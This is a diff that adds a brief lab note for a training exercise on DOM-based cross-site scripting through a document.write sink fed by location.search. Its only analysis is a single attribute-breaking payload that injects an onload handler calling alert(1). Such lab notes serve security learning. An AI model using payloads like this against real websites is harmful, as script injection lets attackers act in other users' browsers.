@@ -1,0 +1,8 @@
+Lab #3: DOM XSS in document.write sink using source location.search
+
+End goal: perform a cross-site scripting attack that calls the alert function.
+
+Analysis:
+
+aaa" onload="alert(1)
+
